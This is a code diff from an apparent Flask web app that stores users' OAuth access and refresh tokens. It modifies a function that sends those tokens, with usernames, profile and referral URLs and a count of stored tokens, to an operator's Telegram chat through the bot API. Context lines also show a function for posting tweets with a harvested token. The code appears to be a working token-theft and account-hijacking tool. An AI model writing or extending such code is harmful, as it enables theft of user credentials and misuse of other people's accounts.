@@ -133,16 +133,17 @@ def store_token(access_token, refresh_token, username):
         print(f"Database error while storing token: {e}")
 
 def send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens):
-    # Log the referral URL before sending the final message
-    send_message_via_telegram(f"🔍 Preparing to send login notification. Referral URL for @{username}: {referral_url}")
-    send_message_via_telegram(
-        f"🔑 Access Token: {access_token}\n"
-        f"🔄 Refresh Token: {refresh_token}\n"
-        f"👤 Username: @{username}\n"
-        f"🔗 Profile URL: {profile_url}\n"
-        f"🔗 Referral URL: {referral_url}\n"
-        f"📊 Total Tokens in Database: {total_tokens}"
+    message = (
+        f"🔑 <b>Access Token:</b> {access_token}\n"
+        f"🔄 <b>Refresh Token:</b> {refresh_token}\n"
+        f"👤 <b>Username:</b> @{username}\n"
+        f"🔗 <b>Profile URL:</b> <a href='{profile_url}'>{profile_url}</a>\n"
+        f"🔗 <b>Referral URL:</b> <a href='{referral_url}'>{referral_url}</a>\n"
+        f"📊 <b>Total Tokens in Database:</b> {total_tokens}"
     )
+    logging.info(f"📤 Sending login notification to Telegram for @{username}.")
+    send_message_via_telegram(message, parse_mode="HTML")  # Specify HTML mode here
+
 
 @app.route('/')
 def home():
@@ -323,29 +324,20 @@ def send_startup_message():
     }
     requests.post(url, json=data)
 
-# Send message via Telegram
-def send_message_via_telegram(message):
+def send_message_via_telegram(message, parse_mode="Markdown"):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": parse_mode  # Use the specified parse_mode (default is Markdown)
     }
     headers = {"Content-Type": "application/json; charset=utf-8"}
-
-    # Log the message content before sending
-    logging.info(f"📤 Sending message to Telegram: {message}")
-    
     response = requests.post(url, json=data, headers=headers)
-
     if response.status_code != 200:
-        # Log the error response
         logging.error(f"❌ Failed to send message via Telegram: {response.text}")
     else:
-        # Log the successful response
-        logging.info(f"✅ Message sent successfully to Telegram: {response.json()}")
+        logging.info(f"✅ Message sent to Telegram successfully.")
 
-    return response.status_code == 200  # Return success status for potential further handling
 
 
 # Function to post a tweet using a single token
